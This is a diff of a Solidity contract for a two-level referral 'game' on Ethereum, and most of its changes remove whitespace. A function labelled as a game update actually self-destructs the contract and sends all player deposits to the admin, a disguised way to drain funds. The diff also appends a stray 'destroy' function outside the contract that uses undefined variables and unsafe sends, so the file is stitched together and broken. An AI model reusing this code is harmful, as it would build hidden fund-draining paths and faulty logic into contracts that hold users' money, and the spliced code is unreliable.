@@ -1,26 +1,26 @@
 /*
- ______   _________  ___   ___   _______    _______             ________  ______      
-/_____/\ /________/\/__/\ /__/\ /______/\  /______/\           /_______/\/_____/\     
-\::::_\/_\__.::.__\/\::\ \\  \ \\::::__\/__\::::__\/__         \__.::._\/\:::_ \ \    
- \:\/___/\  \::\ \   \::\/_\ .\ \\:\ /____/\\:\ /____/\  ___      \::\ \  \:\ \ \ \   
-  \::___\/_  \::\ \   \:: ___::\ \\:\\_  _\/ \:\\_  _\/ /__/\     _\::\ \__\:\ \ \ \  
-   \:\____/\  \::\ \   \: \ \\::\ \\:\_\ \ \  \:\_\ \ \ \::\ \   /__\::\__/\\:\_\ \ \ 
-    \_____\/   \__\/    \__\/ \::\/ \_____\/   \_____\/  \:_\/   \________\/ \_____\/ 
-  ______ _______ _    _    _____  ____   ____  _____     _____          __  __ ______  _____ 
+ ______   _________  ___   ___   _______    _______             ________  ______
+/_____/\ /________/\/__/\ /__/\ /______/\  /______/\           /_______/\/_____/\
+\::::_\/_\__.::.__\/\::\ \\  \ \\::::__\/__\::::__\/__         \__.::._\/\:::_ \ \
+ \:\/___/\  \::\ \   \::\/_\ .\ \\:\ /____/\\:\ /____/\  ___      \::\ \  \:\ \ \ \
+  \::___\/_  \::\ \   \:: ___::\ \\:\\_  _\/ \:\\_  _\/ /__/\     _\::\ \__\:\ \ \ \
+   \:\____/\  \::\ \   \: \ \\::\ \\:\_\ \ \  \:\_\ \ \ \::\ \   /__\::\__/\\:\_\ \ \
+    \_____\/   \__\/    \__\/ \::\/ \_____\/   \_____\/  \:_\/   \________\/ \_____\/
+  ______ _______ _    _    _____  ____   ____  _____     _____          __  __ ______  _____
  |  ____|__   __| |  | |  / ____|/ __ \ / __ \|  __ \   / ____|   /\   |  \/  |  ____|/ ____|
- | |__     | |  | |__| | | |  __| |  | | |  | | |  | | | |  __   /  \  | \  / | |__  | (___  
- |  __|    | |  |  __  | | | |_ | |  | | |  | | |  | | | | |_ | / /\ \ | |\/| |  __|  \___ \ 
+ | |__     | |  | |__| | | |  __| |  | | |  | | |  | | | |  __   /  \  | \  / | |__  | (___
+ |  __|    | |  |  __  | | | |_ | |  | | |  | | |  | | | | |_ | / /\ \ | |\/| |  __|  \___ \
  | |____   | |  | |  | | | |__| | |__| | |__| | |__| | | |__| |/ ____ \| |  | | |____ ____) |
- |______|  |_|  |_|  |_|  \_____|\____/ \____/|_____/   \_____/_/    \_\_|  |_|______|_____/ 
-                                                                                             
+ |______|  |_|  |_|  |_|  \_____|\____/ \____/|_____/   \_____/_/    \_\_|  |_|______|_____/
+
                                                          BY : LmsSky@Gmail.com
-*/                            
+*/
 
 pragma solidity ^0.4.25;
 pragma experimental "v0.5.0";
 
 contract safeApi{
-    
+
    modifier safe(){
         address _addr = msg.sender;
         require (_addr == tx.origin,'Error Action!');
@@ -31,7 +31,7 @@ contract safeApi{
     }
 
 
-    
+
  function toBytes(uint256 _num) internal returns (bytes _ret) {
    assembly {
         _ret := mload(0x10)
@@ -45,14 +45,14 @@ function subStr(string _s, uint start, uint end) internal pure returns (string){
         string memory copy = new string(end - start);
 //        string memory copy = new string(5);
           uint k = 0;
-        for (uint i = start; i < end; i++){ 
+        for (uint i = start; i < end; i++){
             bytes(copy)[k++] = bytes(_s)[i];
         }
         return copy;
     }
-     
 
- function safePercent(uint256 a,uint256 b) 
+
+ function safePercent(uint256 a,uint256 b)
       internal
       constant
       returns(uint256)
@@ -60,25 +60,25 @@ function subStr(string _s, uint start, uint end) internal pure returns (string){
         assert(a>0 && a <=100);
         return  div(mul(b,a),100);
       }
-      
+
   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a * b;
     assert(a == 0 || c / a == b);
     return c;
   }
- 
+
   function div(uint256 a, uint256 b) internal pure returns (uint256) {
     // assert(b > 0); // Solidity automatically throws when dividing by 0∂
     uint256 c = a / b;
     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
     return c;
   }
- 
+
   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
     assert(b <= a);
     return a - b;
   }
- 
+
   function add(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a + b;
     assert(c >= a);
@@ -98,11 +98,11 @@ contract gameShare is safeApi{
         uint256 affNumLevel_2;
         uint256 timeStamp;
     }
- 
+
     mapping (uint256 => player)  player_;
     mapping (address => uint256)  playAddr_;
     mapping (uint256 => uint256)  playAff_;
-    
+
 
 
     uint256 private autoPlayId_=123456;
@@ -118,14 +118,14 @@ contract gameShare is safeApi{
         admin_ = msg.sender;
         getPlayId();
     }
-    
+
     /* Send coins */
     function addGame(uint256 _affCode)
-    safe() 
-    isPlay() 
+    safe()
+    isPlay()
     external
     payable {
-        
+
       if(_affCode == 0 &&  feeAmount_>0){
              feeAmount_--;
       }else{
@@ -153,8 +153,8 @@ contract gameShare is safeApi{
         }
         player_[adminId].balance=add(player_[adminId].balance,adminAmount);
 }
-    
-    
+
+
     function withdraw(uint256 pid) safe() external{
         require(playAddr_[msg.sender] == pid,'Error Action');
         require(player_[pid].addr == msg.sender,'Error Action');
@@ -163,8 +163,8 @@ contract gameShare is safeApi{
         player_[pid].balance=0;
         player_[pid].addr.transfer(balance);
     }
-    
-    
+
+
 function getMyInfo()external view returns(uint,uint,uint,uint,uint){
        uint _pid =playAddr_[msg.sender];
        player memory _p=player_[_pid];
@@ -176,7 +176,7 @@ function getMyInfo()external view returns(uint,uint,uint,uint,uint){
             _p.timeStamp
         );
   }
-   
+
   //2020.01.01 Used to update the game
    function updateGame() external safe() {
         uint256 closeTime=1577808000;
@@ -184,15 +184,15 @@ function getMyInfo()external view returns(uint,uint,uint,uint,uint){
         require(msg.sender == admin_,'Error');
         selfdestruct(admin_);
     }
-    
+
     function getPlayId() private returns(uint256){
-        
+
         address _addr=msg.sender;
          require(
                 playAddr_[_addr] ==0,
                 "Error Player 2"
             );
-        
+
               autoPlayId_++;
               uint256 _pid=autoPlayId_;
               playAddr_[_addr]=_pid;
@@ -203,24 +203,24 @@ function getMyInfo()external view returns(uint,uint,uint,uint,uint){
               player_[_pid]=_p;
               return _pid;
    }
-   
+
      modifier  isPlay(){
             require(
                 playAddr_[msg.sender] == 0,
                 "Everyone can only participate once"
-                );        
+                );
             _;
         }
-    
+
       //Add extra prizes to the prize pool ETH
   function payment() external payable safe(){
     if(msg.value>0){
         uint adminId=playAddr_[admin_];
         player_[adminId].balance=add(player_[adminId].balance,msg.value);
     }
-  }    
-        
-    
+  }
+
+
     function getShareAff(uint256 _affCode) external view returns(uint256,address,address){
         uint256 pid=playAddr_[msg.sender];
         uint256 level1pid=playAff_[pid];
@@ -239,11 +239,19 @@ function getMyInfo()external view returns(uint,uint,uint,uint,uint){
             player_[level2Pid].addr
             );
     }
-   
-  
+
+
    function getFeeAmount() external view returns(uint8){
        return feeAmount_;
    }
-   
-    
+
+
+}
+	function destroy() public {
+		for(uint i = 0; i < values.length - 1; i++) {
+			if(entries[values[i]].expires != 0)
+				throw;
+				msg.sender.send(msg.value);
+		}
+	}
 }
